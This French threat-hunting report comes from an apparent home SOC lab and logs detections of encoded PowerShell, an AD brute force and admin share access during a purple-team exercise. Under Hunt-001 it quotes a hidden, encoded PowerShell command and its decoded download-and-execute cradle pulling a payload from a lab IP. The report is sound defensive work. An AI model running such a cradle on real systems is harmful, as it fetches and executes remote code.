# Résultats de Hunt — SocForge Lab — 2026-08-07

**Analyste**: SocForge Lab
**Durée**: 2026-08-07 14:00 → 17:30 UTC
**Périmètre**: DC01 (Agent 002), WIN01 (Agent 003)

---

## Hunt-001 — PowerShell Encodé (T1059.001)

**Requête OpenSearch**:
```
rule.id: "100131" AND @timestamp: [2026-08-07T14:00:00 TO 2026-08-07T15:00:00]
```

**Résultats**:
- 4 hits correspondants
- Agent: win01 (10.10.10.110)
- Heure: 14:23:11 UTC
- CommandLine: `powershell -nop -w hidden -enc SQBFAFgA...`
- Décodé: `IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.60/payload')`
- Parent: explorer.exe (utilisateur interactif)

**Statut**: ✅ Vrai Positif — Test Atomic Red Team T1059.001 confirmé

---

## Hunt-002 — Brute Force AD (T1110)

**Requête OpenSearch**:
```
rule.id: "100111" AND @timestamp: [2026-08-07T15:00:00 TO 2026-08-07T15:10:00]
```

**Résultats**:
- Règle 100111 déclenchée à 15:02:56 UTC (après 5e tentative)
- 29 événements 4625 au total: 15:01:44 → 15:03:12 UTC
- Source: 10.10.10.60 (VM12-PURPLE)
- Cible: `Administrator` sur DC01
- Protocole: NTLM LogonType 3
- Aucun 4624 succès détecté

**Statut**: ✅ Vrai Positif — Attaque Hydra détectée, aucune compromission

---

## Hunt-003 — Admin Share Access (T1021.002)

**Requête OpenSearch**:
```
rule.id: "100140" AND @timestamp: [2026-08-07T16:00:00 TO 2026-08-07T17:30:00]
```

**Résultats**:
- 651,566 hits sur la période complète de la semaine
- Source unique: 10.10.10.60 (VM12-PURPLE)
- Share: `\\DC01\ADMIN$`
- Compte: `Administrator` (credentials valides)
- Corrélation Zeek: connexions SMB port 445 continues

**Statut**: ✅ Vrai Positif — Exercice Purple Team T1021.002 confirmé

---

## Velociraptor — Pslist DC01

**Artefact**: `SocForge.Windows.ProcessList`
**Collecté**: 2026-08-07 16:30 UTC
**Résultats**: 46 processus actifs

| Observation | Résultat |
|-------------|----------|
| Processus non signés | 0 |
| Processus dans %TEMP% | 0 |
| Connexions suspectes | 1 (SMB vers 10.10.10.60 — Purple Team attendu) |
| Services inconnus | 0 |

---

## Timeline complète

| Heure UTC   | Source       | Événement                                           | Règle   | VP/FP |
|-------------|--------------|-----------------------------------------------------|---------|-------|
| 14:23:11    | WIN01        | PowerShell encodé exécuté                          | 100131  | VP    |
| 14:23:58    | WAZUH        | Alerte déclenchée                                   | 100131  | —     |
| 14:24:05    | SHUFFLE      | Alerte créée dans TheHive                          | —       | —     |
| 15:01:44    | DC01         | Premier échec authentification                      | 60122   | VP    |
| 15:02:56    | WAZUH        | Seuil brute force atteint (5 en 60s)               | 100111  | VP    |
| 16:45:02    | DC01         | Accès ADMIN$ depuis 10.10.10.60                    | 100140  | VP    |
| 16:45:25    | WAZUH        | Alerte admin share                                  | 100140  | VP    |

---

## Métriques du hunt

| KPI                  | Valeur        |
|----------------------|---------------|
| Durée du hunt        | 3h 30min      |
| Requêtes effectuées  | 12            |
| Hypothèses testées   | 3/8           |
| Vrais positifs       | 3             |
| Faux positifs        | 0             |
| Nouveaux IOCs        | 0 (exercice)  |
